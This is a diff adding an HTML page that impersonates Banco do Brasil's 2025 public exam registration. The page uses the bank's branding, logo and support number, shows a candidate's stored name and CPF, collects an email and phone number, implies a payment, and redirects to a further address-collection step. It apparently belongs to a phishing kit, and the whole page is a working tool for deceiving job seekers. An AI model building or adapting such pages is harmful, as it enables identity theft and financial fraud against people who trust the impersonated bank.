@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco do Brasil - Inscrição Concurso 2025 | Dados de Contato</title>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'bb-yellow': '#FEEF37',
+            'bb-blue': '#003DA5',
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+    .card-dados p {
+      font-size: 0.875rem; /* texto menor */
+      color: #374151;      /* tailwind gray-700 */
+    }
+    .card-dados .titulo {
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: #111827;      /* tailwind gray-900 */
+    }
+    .card-dados {
+      background-color: #ffffff;
+      border: 1px solid #e5e7eb; /* tailwind gray-200 */
+      border-radius: 0.5rem;
+      padding: 1rem;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <!-- TOPO AMARELO (LOGO E TÍTULO) -->
+  <header class="bg-bb-yellow py-6 flex flex-col items-center justify-center shadow">
+    <img src="images/uDnvve3cM2Rm.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
+    <p class="text-bb-blue font-bold text-xl">
+      CONCURSO PÚBLICO 2025
+    </p>
+    <p class="text-bb-blue text-sm">
+      SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+    </p>
+  </header>
+
+  <!-- BARRA AZUL (DADOS DE CONTATO) -->
+  <nav class="bg-bb-blue py-3 shadow-md">
+    <div class="container mx-auto px-4 flex items-center justify-center">
+      <span class="text-white text-xl font-semibold tracking-wide">
+        DADOS DE CONTATO
+      </span>
+    </div>
+  </nav>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <main class="container mx-auto px-4 py-8 flex-grow max-w-3xl">
+    <h1 class="text-xl font-semibold text-gray-800 mb-2">
+      Informações de Contato
+    </h1>
+    <p class="text-gray-600 mb-6">
+      Para finalizar seu cadastro, confirme seus dados e informe seu email e telefone:
+    </p>
+
+    <!-- GRID DE INFORMAÇÕES (Nome, CPF, Nível, etc.) -->
+    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-4">
+      <!-- Nome Completo -->
+      <div class="card-dados">
+        <p class="titulo">Nome Completo</p>
+        <p id="nomeCompleto">Fulano de Tal</p>
+      </div>
+      <!-- CPF -->
+      <div class="card-dados">
+        <p class="titulo">CPF</p>
+        <p id="cpfCandidato">000.000.000-00</p>
+      </div>
+      <!-- Nível da Prova -->
+      <div class="card-dados">
+        <p class="titulo">Nível da Prova</p>
+        <p id="nivelProva">Fácil</p>
+      </div>
+      <!-- Quantidade de Questões -->
+      <div class="card-dados">
+        <p class="titulo">Quantidade de Questões</p>
+        <p id="qtdeQuestoes">
+          60 questões (40 conhecimentos básicos + 20 específicas)
+        </p>
+      </div>
+    </div>
+
+    <!-- ALERTA INFORMATIVO -->
+    <div class="bg-yellow-50 border border-yellow-100 rounded-md p-3 mb-8">
+      <p class="text-sm text-yellow-700">
+        Após a confirmação do pagamento, você receberá um SMS com o local de prova
+        mais próximo da sua residência.
+      </p>
+    </div>
+
+    <!-- FORMULÁRIO PARA CONTATO -->
+    <form id="formContato" class="space-y-4">
+      <!-- EMAIL -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="email">
+          Email
+        </label>
+        <div class="relative">
+          <input type="email" id="email" name="email" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                   focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="seu.email@exemplo.com" required="">
+          <!-- Ícone de email (opcional) -->
+          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+            <svg class="w-5 h-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
+              <path d="M2.94 6.33l7.06 4.3 7.06-4.3A2 2 0 0014 4H6a2 2 0 00-3.06 2.33z"></path>
+              <path d="M18 8.67l-6.58 4.01a2 2 0 01-2.04 0L2.8 8.67 2 9.07V14a2 2 0 002 2h12a2 2 0 002-2V9.07l-.8-.4z"></path>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- TELEFONE -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="telefone">
+          Telefone com DDD
+        </label>
+        <div class="relative">
+          <input type="tel" id="telefone" name="telefone" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                   focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="(00) 00000-0000" required="">
+          <!-- Ícone de telefone (opcional) -->
+          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+            <svg class="w-5 h-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
+              <path fill-rule="evenodd" d="M2 3.994C2 2.892 2.894 2 3.994 2H16.01C17.108 2 18 2.891 18 3.994v12.012C18 17.108 17.108 18 16.01 18H3.994A1.994 1.994 0 012 16.006V3.994zM8 5a1 1 0 000 2h4a1 1 0 100-2H8z" clip-rule="evenodd"></path>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- BOTÃO DE CONFIRMAR (SALVAR EMAIL/TEL) -->
+      <div class="pt-4">
+        <!-- type="submit" para acionar o evento de submit -->
+        <button type="submit" class="bg-bb-blue text-white font-medium py-3 px-6 w-full rounded-md 
+                 hover:bg-blue-800 transition text-lg">
+          Confirmar Informações
+        </button>
+      </div>
+    </form>
+  </main>
+
+  <!-- RODAPÉ -->
+  <footer class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto">
+    <p class="text-sm font-medium">
+      © 2025 Banco do Brasil S.A. Todos os direitos reservados.
+    </p>
+    <p class="text-sm mt-1">
+      Central de Atendimento BB - 0800 729 0722
+    </p>
+  </footer>
+
+  <!-- SCRIPT: Carregar dados (Nome, CPF, Nível) do localStorage -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      // Lê do localStorage
+      const nome   = localStorage.getItem("nomeCandidato") || "Fulano de Tal";
+      const cpf    = localStorage.getItem("cpfCandidato")  || "000.000.000-00";
+      const nivel  = localStorage.getItem("nivelProva")    || "Fácil";
+      
+      // Atualiza os elementos na tela
+      document.getElementById("nomeCompleto").textContent = nome;
+      document.getElementById("cpfCandidato").textContent = cpf;
+      document.getElementById("nivelProva").textContent   = nivel;
+    });
+  </script>
+
+  <!-- SCRIPT: Capturar Email/Telefone e Salvar no localStorage -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const form = document.getElementById("formContato");
+
+      form.addEventListener("submit", function(e) {
+        e.preventDefault(); 
+        // Pega valores digitados
+        const emailValue    = document.getElementById("email").value;
+        const telefoneValue = document.getElementById("telefone").value;
+
+        // Salva no localStorage
+        localStorage.setItem("emailCandidato", emailValue);
+        localStorage.setItem("telefoneCandidato", telefoneValue);
+
+        // Redireciona para a página de CEP (por exemplo "cep.html")
+        window.location.href = "cep.html";
+      });
+    });
+  </script>
+
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508546'},{'dcenter':'p3'},{'cp_id':'10284161'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body></html>
